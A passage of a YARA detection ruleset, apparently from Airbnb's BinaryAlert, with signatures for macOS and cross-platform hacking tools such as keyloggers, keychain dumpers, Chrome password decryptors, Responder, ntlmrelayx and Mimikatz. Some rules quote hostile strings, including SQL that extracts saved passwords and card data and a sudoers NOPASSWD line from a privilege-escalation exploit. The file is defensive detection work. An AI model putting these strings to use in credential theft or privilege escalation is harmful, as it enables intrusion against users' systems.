		logic_hash = "b1035174edfff2e142026f3482fc53407af59f5215a6030c0d2a85501152c3db"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "loadoerf.ini" fullword ascii wide
		$s2 = "gzwrite64" fullword ascii wide

	condition:
		all of ( $s* )
}

rule BINARYALERT_Hacktool_Macos_N0Fate_Chainbreaker
{
	meta:
		description = "chainbreaker can extract user credential in a Keychain file with Master Key or user password in forensically sound manner."
		author = "@mimeframe"
		id = "565d31c6-8d80-534d-8acc-c01d7af4f8b3"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/n0fate/chainbreaker"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_n0fate_chainbreaker.yara#L1-L13"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "7aedf952756ed2375ff171329179f14a8cdc37ada69e1f003def1f1de5bc1691"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "[!] Private Key Table is not available" wide ascii
		$a2 = "[!] Public Key Table is not available" wide ascii
		$a3 = "[-] Decrypted Private Key" wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Manwhoami_Icloudcontacts
{
	meta:
		description = "Pulls iCloud Contacts for an account. No dependencies. No user notification."
		author = "@mimeframe"
		id = "b6595540-7f89-5764-b34e-d32c1a377b6c"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/manwhoami/iCloudContacts"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_manwhoami_icloudcontacts.yara#L1-L14"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "0c5b81454b26de91f5ad126b24f10397e1da5d8561b0bf22c5df128753df0ac2"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "https://setup.icloud.com/setup/authenticate/" wide ascii
		$a2 = "https://p04-contacts.icloud.com/" wide ascii
		$a3 = "HTTP Error 401: Unauthorized. Are you sure the credentials are correct?" wide ascii
		$a4 = "HTTP Error 404: URL not found. Did you enter a username?" wide ascii

	condition:
		3 of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Juuso_Keychaindump
{
	meta:
		description = "For reading OS X keychain passwords as root."
		author = "@mimeframe"
		id = "10ee6c24-db35-5178-9a40-92f5231948aa"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/juuso/keychaindump"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_juuso_keychaindump.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "dd2fb6249fe4b7381e734ea3a308158159f7e79b39ba5c970241dcd66436d669"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "[-] Too many candidate keys to fit in memory" wide ascii
		$a2 = "[-] Could not allocate memory for key search" wide ascii
		$a3 = "[-] Too many credentials to fit in memory" wide ascii
		$a4 = "[-] The target file is not a keychain file" wide ascii
		$a5 = "[-] Could not find the securityd process" wide ascii
		$a6 = "[-] No root privileges, please run with sudo" wide ascii

	condition:
		4 of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Keylogger_Caseyscarborough
{
	meta:
		description = "A simple and easy to use keylogger for macOS."
		author = "@mimeframe"
		id = "82d9ff7e-b475-5888-82e1-f65c286a9cde"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/caseyscarborough/keylogger"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_keylogger_caseyscarborough.yara#L1-L14"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "d97fbfefe027a26ec998743b811734e62423e8a5ba4e11d516dcfc9e4831d296"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "/var/log/keystroke.log" wide ascii
		$a2 = "ERROR: Unable to create event tap." wide ascii
		$a3 = "Keylogging has begun." wide ascii
		$a4 = "ERROR: Unable to open log file. Ensure that you have the proper permissions." wide ascii

	condition:
		2 of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Manwhoami_Osxchromedecrypt
{
	meta:
		description = "Decrypt Google Chrome / Chromium passwords and credit cards on macOS / OS X."
		author = "@mimeframe"
		id = "874cc999-d9c2-5017-83ec-e4be8a659476"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/manwhoami/OSXChromeDecrypt"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_manwhoami_osxchromedecrypt.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "0974c6a5e7875e20380df0f58bf22a589b9a5c718e635ec77b42060abcf99473"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "Credit Cards for Chrome Profile" wide ascii
		$a2 = "Passwords for Chrome Profile" wide ascii
		$a3 = "Unknown Card Issuer" wide ascii
		$a4 = "ERROR getting Chrome Safe Storage Key" wide ascii
		$b1 = "select name_on_card, card_number_encrypted, expiration_month, expiration_year from credit_cards" wide ascii
		$b2 = "select username_value, password_value, origin_url, submit_element from logins" wide ascii

	condition:
		3 of ( $a* ) or all of ( $b* )
}

rule BINARYALERT_Hacktool_Macos_Keylogger_Giacomolaw
{
	meta:
		description = "A simple keylogger for macOS."
		author = "@mimeframe"
		id = "81fcf792-a0a9-5b97-a71c-4c517a7b910c"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/GiacomoLaw/Keylogger"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_keylogger_giacomolaw.yara#L1-L13"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "45ca583c07b8593ed716306ae6f80eef1c3fc5652aed739454fa8007fae929b4"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "ERROR: Unable to access keystroke log file. Please make sure you have the correct permissions." wide ascii
		$a2 = "ERROR: Unable to create event tap." wide ascii
		$a3 = "Keystrokes are now being recorded" wide ascii

	condition:
		2 of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Macpmem
{
	meta:
		description = "MacPmem enables read/write access to physical memory on macOS. Can be used by CSIRT teams and attackers."
		author = "@mimeframe"
		id = "4890598e-936c-5a4d-9004-88ff4fe57c49"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/google/rekall/tree/master/tools/osx/MacPmem"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_macpmem.yara#L3-L22"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "d64b5a5423932211e3b72d949028f3f0ed1f1435e9584cffa947f2bd4846c29b"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "%s/MacPmem.kext" wide ascii
		$a2 = "The Pmem physical memory imager." wide ascii
		$a3 = "The OSXPmem memory imager." wide ascii
		$a4 = "These AFF4 Volumes will be loaded and their metadata will be parsed before the program runs." wide ascii
		$a5 = "Pmem driver version incompatible. Reported" wide ascii
		$a6 = "Memory access driver left loaded since you specified the -l flag." wide ascii
		$b1 = "Unloading MacPmem" wide ascii
		$b2 = "MacPmem load tag is" wide ascii

	condition:
		BINARYALERT_Macho_PRIVATE and 2 of ( $a* ) or all of ( $b* )
}

rule BINARYALERT_Hacktool_Macos_Exploit_Tpwn
{
	meta:
		description = "tpwn exploits a null pointer dereference in XNU to escalate privileges to root."
		author = "@mimeframe"
		id = "b69c4e1c-554e-5553-9b21-6cdf33aff24e"
		date = "2017-09-14"
		modified = "2017-09-14"
		reference = "https://www.rapid7.com/db/modules/exploit/osx/local/tpwn"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_exploit_tpwn.yara#L1-L14"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "f864d8c137746edd50526b1d3d95a7335f776cf1473d2d2ea28856dbc515dd9f"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "[-] Couldn't find a ROP gadget, aborting." wide ascii
		$a2 = "leaked kaslr slide," wide ascii
		$a3 = "didn't get root, but this system is vulnerable." wide ascii
		$a4 = "Escalating privileges! -qwertyoruiop" wide ascii

	condition:
		2 of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Keylogger_Logkext
{
	meta:
		description = "LogKext is an open source keylogger for Mac OS X, a product of FSB software."
		author = "@mimeframe"
		id = "2e4ad9d0-5780-5a28-a76d-baac401b0648"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/SlEePlEs5/logKext"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_keylogger_logkext.yara#L1-L25"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "f0e3a7ea8ec4568c319e44f00d71fb368948b6fe08bdf86de4b33f0d2bafbb44"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "logKextPassKey" wide ascii
		$a2 = "Couldn't get system keychain:" wide ascii
		$a3 = "Error finding secret in keychain" wide ascii
		$a4 = "com_fsb_iokit_logKext" wide ascii
		$b1 = "logKext Password:" wide ascii
		$b2 = "Logging controls whether the daemon is logging keystrokes (default is on)." wide ascii
		$c1 = "logKextPassKey" wide ascii
		$c2 = "Error: couldn't create secAccess" wide ascii
		$d1 = "IOHIKeyboard" wide ascii
		$d2 = "Clear keyboards called with kextkeys" wide ascii
		$d3 = "Added notification for keyboard" wide ascii

	condition:
		3 of ( $a* ) or all of ( $b* ) or all of ( $c* ) or all of ( $d* )
}

rule BINARYALERT_Hacktool_Macos_Keylogger_Dannvix
{
	meta:
		description = "A simple keylogger for macOS."
		author = "@mimeframe"
		id = "598d6dbc-540d-5f96-8bd1-c15e6194012e"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/dannvix/keylogger-osx"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_keylogger_dannvix.yara#L1-L13"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "95d0540b1308caf3e7287c70a759954650220192800c0154d225bcb01ed55766"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "/var/log/keystroke.log" wide ascii
		$a2 = "<forward-delete>" wide ascii
		$a3 = "<unknown>" wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Exploit_Cve_5889
{
	meta:
		description = "No description has been set in the source file - BinaryAlert"
		author = "@mimeframe"
		id = "ea70d31c-1b70-5927-ba8d-e13d2114e74e"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://www.exploit-db.com/exploits/38371/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_exploit_cve_2015_5889.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "b455759ea369cdcf2f05a2735a38000179ebe644667016cd635dfad9beda4459"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "/etc/sudoers" fullword wide ascii
		$a2 = "/etc/crontab" fullword wide ascii
		$a3 = "* * * * * root echo" wide ascii
		$a4 = "ALL ALL=(ALL) NOPASSWD: ALL" wide ascii
		$a5 = "/usr/bin/rsh" fullword wide ascii
		$a6 = "localhost" fullword wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Keylogger_Eldeveloper_Keystats
{
	meta:
		description = "A simple keylogger for macOS."
		author = "@mimeframe"
		id = "7fddb502-ae2d-5e14-95f5-115498fa5926"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/ElDeveloper/keystats"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_keylogger_eldeveloper_keystats.yara#L1-L13"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "c73f5ca2ba0a1bde7c1f9b96173938e40511e12f875c4d850d6d498c63e89385"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "YVBKeyLoggerPerishedNotification" wide ascii
		$a2 = "YVBKeyLoggerPerishedByLackOfResponseNotification" wide ascii
		$a3 = "YVBKeyLoggerPerishedByUserChangeNotification" wide ascii

	condition:
		2 of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Keylogger_Skreweverything_Swift
{
	meta:
		description = "It is a simple and easy to use keylogger for macOS written in Swift."
		author = "@mimeframe"
		id = "a4918bc3-d3f0-59f4-894f-fd34ee944fac"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/SkrewEverything/Swift-Keylogger"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_keylogger_skreweverything_swift.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "f400b8ec392417e7443e82a2c2a9adfc868b9795aa1fb29f91d228f6f94efd13"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "Can't create directories!" wide ascii
		$a2 = "Can't create manager" wide ascii
		$a3 = "Can't open HID!" wide ascii
		$a4 = "PRINTSCREEN" wide ascii
		$a5 = "LEFTARROW" wide ascii

	condition:
		4 of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Ptoomey3_Keychain_Dumper
{
	meta:
		description = "Keychain dumping utility."
		author = "@mimeframe"
		id = "c45abbbe-f5fe-5a87-acd4-dcdb99ceec28"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/ptoomey3/Keychain-Dumper"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_ptoomey3_keychain_dumper.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "f2ef979e4682ce617b37f7503ec2ca520e657b4f6d15a75afad59b62191a1a43"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "keychain_dumper" wide ascii
		$a2 = "/var/Keychains/keychain-2.db" wide ascii
		$a3 = "<key>keychain-access-groups</key>" wide ascii
		$a4 = "SELECT DISTINCT agrp FROM genp UNION SELECT DISTINCT agrp FROM inet" wide ascii
		$a5 = "dumpEntitlements" wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Keylogger_B4Rsby_Swiftlog
{
	meta:
		description = "Dirty user level command line keylogger hacked together in Swift."
		author = "@mimeframe"
		id = "b1ae8284-04a0-5818-9997-0e31eb51ed2b"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/b4rsby/SwiftLog"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_keylogger_b4rsby_swiftlog.yara#L1-L11"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "c66dcab2da0e543198f97ca104c13533c8950d10b6f7cbd3f906348d0f8c45ff"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "You need to enable the keylogger in the System Prefrences" wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Keylogger_Roxlu_Ofxkeylogger
{
	meta:
		description = "ofxKeylogger keylogger."
		author = "@mimeframe"
		id = "c0e00b76-9623-5709-b64b-0afe006eba60"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/roxlu/ofxKeylogger"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_keylogger_roxlu_ofxkeylogger.yara#L1-L13"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "6e2579a10327cc8f1799848b3bcbcd95733a31098faeb849df6ebf99f1ffe808"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "keylogger_init" wide ascii
		$a2 = "install_keylogger_hook function not found in dll." wide ascii
		$a3 = "keylogger_set_callback" wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Hacktool_Macos_Manwhoami_Mmetokendecrypt
{
	meta:
		description = "This program decrypts / extracts all authorization tokens on macOS / OS X / OSX."
		author = "@mimeframe"
		id = "2dc01ff3-4c4a-548d-b2f0-b36897ad6a5c"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/manwhoami/MMeTokenDecrypt"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/macos/hacktool_macos_manwhoami_mmetokendecrypt.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "ccfedfbff0c6eefe41e80fe488d4cae928a33e7b86019c6ec54d1c9005b35147"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "security find-generic-password -ws 'iCloud'" wide ascii
		$a2 = "ERROR getting iCloud Decryption Key" wide ascii
		$a3 = "Could not find MMeTokenFile. You can specify the file manually." wide ascii
		$a4 = "Decrypting token plist ->" wide ascii
		$a5 = "Successfully decrypted token plist!" wide ascii

	condition:
		3 of ( $a* )
}

rule BINARYALERT_Hacktool_Multi_Jtesta_Ssh_Mitm
{
	meta:
		description = "intercepts ssh connections to capture credentials"
		author = "@fusionrace"
		id = "fa8362e2-83d3-5830-8952-502684ad66f9"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/jtesta/ssh-mitm"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/multi/hacktool_multi_jtesta_ssh_mitm.yara#L1-L12"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "1d19c83f7d648a0d30074debcd76ff0faf72afa6722251661f8640abdc12a2a9"
		score = 50
		quality = 80
		tags = ""

	strings:
		$a1 = "INTERCEPTED PASSWORD:" wide ascii
		$a2 = "more sshbuf problems." wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Hacktool_Multi_Responder_Py
{
	meta:
		description = "Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server"
		author = "@fusionrace"
		id = "82699a67-8ba1-5535-9183-3c857e60134c"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "http://www.c0d3xpl0it.com/2017/02/compromising-domain-admin-in-internal-pentest.html"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/multi/hacktool_multi_responder_py.yara#L1-L17"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "a99a806b7c578af1f2163583f957db13fa7269c7426666189d85bec2ac87ad4b"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "Poison all requests with another IP address than Responder's one." fullword ascii wide
		$s2 = "Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned." fullword ascii wide
		$s3 = "Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network." fullword ascii wide
		$s4 = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query." fullword ascii wide
		$s5 = "Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)" fullword ascii wide
		$s6 = "31mOSX detected, -i mandatory option is missing" fullword ascii wide
		$s7 = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query." fullword ascii wide

	condition:
		any of them
}

rule BINARYALERT_Hacktool_Multi_Bloodhound_Owned
{
	meta:
		description = "Bloodhound: Custom queries to document a compromise, find collateral spread of owned nodes, and visualize deltas in privilege gains"
		author = "@fusionrace"
		id = "4d458339-6589-5094-8c23-1ad2baee19f1"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/porterhau5/BloodHound-Owned/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/multi/hacktool_multi_bloodhound_owned.yara#L1-L20"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "01ef15a3cd606c46dacb0f22477fe97f94e212a38af1cd5bdd7eb11efe8144dd"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "Find all owned Domain Admins" fullword ascii wide
		$s2 = "Find Shortest Path from owned node to Domain Admins" fullword ascii wide
		$s3 = "List all directly owned nodes" fullword ascii wide
		$s4 = "Set owned and wave properties for a node" fullword ascii wide
		$s5 = "Find spread of compromise for owned nodes in wave" fullword ascii wide
		$s6 = "Show clusters of password reuse" fullword ascii wide
		$s7 = "Something went wrong when creating SharesPasswordWith relationship" fullword ascii wide
		$s8 = "reference doc of custom Cypher queries for BloodHound" fullword ascii wide
		$s9 = "Created SharesPasswordWith relationship between" fullword ascii wide
		$s10 = "Skipping finding spread of compromise due to" fullword ascii wide

	condition:
		any of them
}

rule BINARYALERT_Hacktool_Multi_Ncc_ABPTTS
{
	meta:
		description = "Allows for TCP tunneling over HTTP"
		author = "@mimeframe"
		id = "dd5f6316-9e51-5cc8-b293-dc33b09cc801"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/nccgroup/ABPTTS"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/multi/hacktool_multi_ncc_ABPTTS.yara#L1-L19"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "09874b1d997ac193ad1afa0226f6fb22836c8720c0599d773b18072b92a3acc4"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "---===[[[ A Black Path Toward The Sun ]]]===---" ascii wide
		$s2 = "https://vulnerableserver/EStatus/" ascii wide
		$s3 = "Error: no ABPTTS forwarding URL was specified. This utility will now exit." ascii wide
		$s4 = "tQgGur6TFdW9YMbiyuaj9g6yBJb2tCbcgrEq" fullword ascii wide
		$s5 = "63688c4f211155c76f2948ba21ebaf83" fullword ascii wide
		$s6 = "ABPTTSClient-log.txt" fullword ascii wide

	condition:
		any of them
}

rule BINARYALERT_Hacktool_Multi_Masscan
{
	meta:
		description = "masscan is a performant port scanner, it produces results similar to nmap"
		author = "@mimeframe"
		id = "adb2bb07-2a1a-5eb5-8049-b3f8e6cba48a"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/robertdavidgraham/masscan"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/multi/hacktool_multi_masscan.yara#L1-L17"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "b35e481f73b1c1722056157f8348e2e06bb109c094b948fc6be2d9a7df070a7f"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "EHLO masscan" fullword wide ascii
		$a2 = "User-Agent: masscan/" wide ascii
		$a3 = "/etc/masscan/masscan.conf" fullword wide ascii
		$b1 = "nmap(%s): unsupported. This code will never do DNS lookups." wide ascii
		$b2 = "nmap(%s): unsupported, we do timing WAY different than nmap" wide ascii
		$b3 = "[hint] I've got some local priv escalation 0days that might work" wide ascii
		$b4 = "[hint] VMware on Macintosh doesn't support masscan" wide ascii

	condition:
		all of ( $a* ) or any of ( $b* )
}

rule BINARYALERT_Hacktool_Multi_Pyrasite_Py
{
	meta:
		description = "A tool for injecting arbitrary code into running Python processes."
		author = "@fusionrace"
		id = "0acd0044-a41c-5e9e-bb94-301cd704cf9d"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/lmacken/pyrasite"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/multi/hacktool_multi_pyrasite_py.yara#L1-L24"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "7f3f3df5bd5c1bee2d85ff97878ad36223ab743926a5f8f1c079b039f724abc9"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "WARNING: ptrace is disabled. Injection will not work." fullword ascii wide
		$s2 = "A payload that connects to a given host:port and receives commands" fullword ascii wide
		$s3 = "A reverse Python connection payload." fullword ascii wide
		$s4 = "pyrasite - inject code into a running python process" fullword ascii wide
		$s5 = "The ID of the process to inject code into" fullword ascii wide
		$s6 = "This file is part of pyrasite." fullword ascii wide
		$s7 = "https://github.com/lmacken/pyrasite" fullword ascii wide
		$s8 = "Setup a communication socket with the process by injecting" fullword ascii wide
		$s9 = "a reverse subshell and having it connect back to us." fullword ascii wide
		$s10 = "Write out a reverse python connection payload with a custom port" fullword ascii wide
		$s11 = "Wait for the injected payload to connect back to us" fullword ascii wide
		$s12 = "PyrasiteIPC" fullword ascii wide
		$s13 = "A reverse Python shell that behaves like Python interactive interpreter." fullword ascii wide
		$s14 = "pyrasite cannot establish reverse" fullword ascii wide

	condition:
		any of them
}

rule BINARYALERT_Hacktool_Multi_Ntlmrelayx
{
	meta:
		description = "No description has been set in the source file - BinaryAlert"
		author = "@mimeframe"
		id = "7e0bc28f-9cb7-5c09-aedc-d95af23454aa"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/multi/hacktool_multi_ntlmrelayx.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "0d5d2d38866eb243e1803c456944e887d9d3920c54b15fd658bf90831fd87bfa"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "Started interactive SMB client shell via TCP" wide ascii
		$a2 = "Service Installed.. CONNECT!" wide ascii
		$a3 = "Done dumping SAM hashes for host:" wide ascii
		$a4 = "DA already added. Refusing to add another" wide ascii
		$a5 = "Domain info dumped into lootdir!" wide ascii

	condition:
		any of ( $a* )
}

rule BINARYALERT_Hacktool_Windows_Mimikatz_Copywrite
{
	meta:
		description = "Mimikatz credential dump tool: Author copywrite"
		author = "@fusionrace"
		id = "bf7a52b5-c0af-5805-a2da-41ae3842e0c6"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/gentilkiwi/mimikatz"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_mimikatz_copywrite.yara#L1-L24"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "f0e8a8b0c7398e7af06bd074eec0433265ba0e675bdbff354e59432c246b0b36"
		score = 75
		quality = 80
		tags = ""
		md5_1 = "0c87c0ca04f0ab626b5137409dded15ac66c058be6df09e22a636cc2bcb021b8"
		md5_2 = "0c91f4ca25aedf306d68edaea63b84efec0385321eacf25419a3050f2394ee3b"
		md5_3 = "0fee62bae204cf89d954d2cbf82a76b771744b981aef4c651caab43436b5a143"
		md5_4 = "004c07dcd04b4e81f73aacd99c7351337f894e4dac6c91dcfaadb4a1510a967c"
		md5_5 = "09c542ff784bf98b2c4899900d4e699c5b2e2619a4c5eff68f6add14c74444ca"
		md5_6 = "09054be3cc568f57321be32e769ae3ccaf21653e5d1e3db85b5af4421c200669"

	strings:
		$s1 = "Kiwi en C" fullword ascii wide
